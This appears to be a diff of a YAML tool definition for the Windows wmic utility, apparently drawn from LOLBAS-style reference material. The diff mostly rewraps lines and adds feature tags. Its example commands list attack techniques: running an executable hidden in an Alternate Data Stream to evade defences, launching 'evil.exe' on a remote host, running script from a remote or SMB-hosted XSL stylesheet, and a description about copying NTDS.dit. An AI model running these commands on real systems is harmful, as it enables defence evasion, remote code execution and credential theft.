@@ -2,7 +2,8 @@
 id: windows-execution-wmic
 namespace: windows:execution:wmic
 name: wmic
-description: 'The WMI command-line (WMIC) utility provides a command-line interface for WMI Located at: C:\Windows\System32\wbem\wmic.exe; C:\Windows\SysWOW64\wbem\wmic.exe.'
+description: 'The WMI command-line (WMIC) utility provides a command-line interface
+  for WMI Located at: C:\Windows\System32\wbem\wmic.exe; C:\Windows\SysWOW64\wbem\wmic.exe.'
 author: Oddvar Moe
 version: 1.0.0
 capabilities:
@@ -44,7 +45,12 @@ resource_profile:
 allowed-tools:
 - wmic
 parameters: []
-features: []
+features:
+- file-system
+- local
+- pipes-stdin
+- pipes-stdout
+- streaming
 execution:
   template: wmic
   sandbox: execFile
@@ -52,18 +58,24 @@ execution:
   shell: false
 global_vars: {}
 examples:
-- description: Execute a .EXE file stored as an Alternate Data Stream (ADS) (Execute binary file hidden in Alternate data streams to evade defensive counter measures)
+- description: Execute a .EXE file stored as an Alternate Data Stream (ADS) (Execute
+    binary file hidden in Alternate data streams to evade defensive counter measures)
   command: wmic.exe process call create "{PATH_ABSOLUTE}:program.exe"
-- description: Execute calc from wmic (Execute binary from wmic to evade defensive counter measures)
+- description: Execute calc from wmic (Execute binary from wmic to evade defensive
+    counter measures)
   command: wmic.exe process call create "{CMD}"
-- description: Execute evil.exe on the remote system. (Execute binary on a remote system)
+- description: Execute evil.exe on the remote system. (Execute binary on a remote
+    system)
   command: wmic.exe /node:"192.168.0.1" process call create "{CMD}"
-- description: Create a volume shadow copy of NTDS.dit that can be copied. (Execute binary on remote system)
+- description: Create a volume shadow copy of NTDS.dit that can be copied. (Execute
+    binary on remote system)
   command: wmic.exe process get brief /format:"{REMOTEURL:.xsl}"
-- description: Executes JScript or VBScript embedded in the target remote XSL stylsheet. (Execute script from remote system)
+- description: Executes JScript or VBScript embedded in the target remote XSL stylsheet.
+    (Execute script from remote system)
   command: wmic.exe process get brief /format:"{PATH_SMB:.xsl}"
 - description: Copy file from source to destination. (Copy file.)
-  command: wmic.exe datafile where "Name='C:\\windows\\system32\\calc.exe'" call Copy "C:\\users\\public\\calc.exe"
+  command: wmic.exe datafile where "Name='C:\\windows\\system32\\calc.exe'" call Copy
+    "C:\\users\\public\\calc.exe"
 references:
 - label: wmic-how-to-use-process-call-create-with-a-specifi
   url: https://stackoverflow.com/questions/24658745/wmic-how-to-use-process-call-create-with-a-specific-working-directory
@@ -119,7 +131,6 @@ install:
   commands:
   - choco install wmic
 ---
-
 
 # wmic
 
